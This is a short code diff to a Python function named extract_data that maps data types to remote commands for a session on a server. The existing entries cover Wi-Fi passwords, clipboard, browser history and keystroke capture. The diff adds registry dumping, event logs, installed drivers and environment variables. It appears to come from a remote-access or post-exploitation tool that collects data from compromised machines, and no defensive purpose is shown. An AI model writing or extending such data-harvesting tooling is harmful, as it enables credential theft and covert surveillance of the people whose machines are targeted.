@@ -18,7 +18,11 @@ def extract_data(server, session_id, data_type):
         'wifi_passwords': 'get_wifi_passwords',
         'clipboard': 'get_clipboard_content',
         'browser_history': 'get_browser_history',
-        'keystrokes': 'capture_keystrokes'
+        'keystrokes': 'capture_keystrokes',
+        'registry': 'dump_registry',
+        'event_logs': 'get_event_logs',
+        'installed_drivers': 'list_installed_drivers',
+        'environment_variables': 'get_environment_variables'
     }
     
     if data_type not in commands:
